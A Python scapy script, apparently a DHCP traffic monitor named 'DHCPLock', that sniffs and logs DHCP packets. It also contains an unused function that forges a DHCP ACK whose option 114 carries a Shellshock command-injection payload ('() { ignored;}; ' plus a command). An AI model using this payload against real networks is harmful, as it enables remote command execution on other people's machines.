#!/usr/bin/env python3

from scapy.all import *
import logging
import argparse

#BOOTP
#siaddr = DHCP server ip
#yiaddr = ip offered to client
#xid = transaction id 
#chaddr = clients mac address in binary format

DHCPTypes = {
	"discover": 1,
	"offer": 2,
	"request": 3,
	#TODO 4: "decline",
	"ack": 5,
	#TODO 6: "nak",
	"release": 7,
	#TODO 8: "inform",
	#TODO 9: "force_renew",
	#TODO 10: "lease_query",
	#TODO 11: "lease_unassigned",
	#TODO 12: "lease_unknown",
	#TODO 13: "lease_active",
}

def dhcp_ack(raw_mac, xid, command):
	packet = Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') 
	packet /= IP(src="0.0.0.0", dst='255.255.255.255')
	packet /= UDP(sport=67, dport=68)
	packet /= BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid)
	packet /= DHCP(options=[("message-type", "ack"),
		('server_id', '192.168.2.1'),
		('subnet_mask', '255.255.255.0'),
		('router', '192.168.2.5'),
		('lease_time', 172800),
		('renewal_time', 86400),
		('rebinding_time', 138240),
		(114, "() { ignored;}; " + command),
		"end"])
	return packet


# Fixup function to extract dhcp_options by key
def get_option(dhcp_options, key):
    must_decode = ['hostname', 'domain', 'vendor_class_id', 'message-type']
    try:
        for i in dhcp_options:
            if i[0] == key:
                # If DHCP Server Returned multiple name servers 
                # return all as comma seperated string.
                if key == 'name_server' and len(i) > 2:
                    return ",".join(i[1:])
                # domain and hostname are binary strings,
                # decode to unicode string before returning
                elif key in must_decode:
                    return i[1].decode()
                else: 
                    return i[1]        
    except:
        pass


def dhcp(resp):
	if resp.haslayer(DHCP):
		mac_addr = resp[Ether].src
		xid = resp[BOOTP].xid
		
		# ---- DHCP DISCOVER ----
		if resp[DHCP].options[0][1] == DHCPTypes.get('discover'):
			logging.info("[*] Got new DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
			hostname = get_option(resp[DHCP].options, 'hostname')
			logging.info(f"Host {hostname} ({resp[Ether].src}) asked for an IP")
			#logging.info(resp.show())

		# ---- DHCP OFFER ----
		elif resp[DHCP].options[1][1] == DHCPTypes.get('offer'):
			logging.info("[*] Got new DHCP OFFER from: " + mac_addr + " xid: " + hex(xid))
			subnet_mask = get_option(resp[DHCP].options, 'subnet_mask')
			lease_time = get_option(resp[DHCP].options, 'lease_time')
			router = get_option(resp[DHCP].options, 'router')
			name_server = get_option(resp[DHCP].options, 'name_server')
			domain = get_option(resp[DHCP].options, 'domain')

			logging.info(f"DHCP Server {resp[IP].src} ({resp[Ether].src}) "
			      f"offered {resp[BOOTP].yiaddr}")

			logging.info(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: "
			      f"{lease_time}, router: {router}, name_server: {name_server}, "
			      f"domain: {domain}")

		# ---- DHCP REQUEST ----
		elif resp[DHCP].options[0][1] == DHCPTypes.get('request'):
			logging.info("[*] Got new DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
			requested_addr = get_option(resp[DHCP].options, 'requested_addr')
			hostname = get_option(resp[DHCP].options, 'hostname')
			logging.info(f"Host {hostname} ({resp[Ether].src}) requested {requested_addr}")
			#logging.info(resp.show())
			
			
		# ---- DHCP ACK ----
		elif resp[DHCP].options[1][1] == DHCPTypes.get('ack'):
			logging.info("[*] Got new DHCP ACKNOLEDGMENT from: " + mac_addr + " xid: " + hex(xid))
			subnet_mask = get_option(resp[DHCP].options, 'subnet_mask')
			lease_time = get_option(resp[DHCP].options, 'lease_time')
			router = get_option(resp[DHCP].options, 'router')
			name_server = get_option(resp[DHCP].options, 'name_server')
			domain = get_option(resp[DHCP].options, 'domain')


			logging.info(f"DHCP Server {resp[IP].src} ({resp[Ether].src}) "
			      f"offered {resp[BOOTP].yiaddr}")

			logging.info(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: "
			      f"{lease_time}, router: {router}, name_server: {name_server}, "
			      f"domain: {domain}")
			  
		# ---- DHCP RELEASE ----
		elif resp[DHCP].options[0][1] == DHCPTypes.get('release'):
			#print(resp.show())
			ciaddr = resp[BOOTP].ciaddr
			logging.info(f"[*] Got new DHCP RELEASE of {ciaddr} {mac_addr} xid: {hex(xid)}")
			server_id = resp[DHCP].options[1][1]
			hostname = get_option(resp[DHCP].options, 'hostname')
			#TODO: check for rogue DHCP here (for certain server_id)
			logging.info(f"Host {hostname} with IP {ciaddr} ({mac_addr}) released to {server_id}")
			      
		else:
			print(f"I dont know this DHCP packet")
			print(resp.show())


def main():
	# logger
	logging.basicConfig(filename='myapp.log', filemode='w', level=logging.INFO, format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s', datefmt='%m-%d %H:%M')
	console = logging.StreamHandler()
	console.setLevel(logging.INFO)
	formatter = logging.Formatter('%(name)-12s: %(levelname)-8s %(message)s')
	console.setFormatter(formatter)
	logging.getLogger().addHandler(console)
	#args_parser
	parser = argparse.ArgumentParser(description='DHCPLock', epilog='Lock dem baby!')
	parser.add_argument('-i', '--iface', type=str, help='Interface to use')
	parser.add_argument('-n', '--quantity', type=str, help='The number of trusted DHCP servers')
	parser.add_argument('-s', '--servers', type=str, help='Trusted DHCP servers` IP addresses')
	args = parser.parse_args()
	# settings for interface and dhcplock_filter
	interface = 'enp0s9'
	dhcplock_filter = 'port 67 or port 68'
	logging.info("[*] Waiting for a DHCP Packets...")
	sniff(iface=interface, filter=dhcplock_filter, prn=dhcp)


if __name__ == '__main__':
	main()
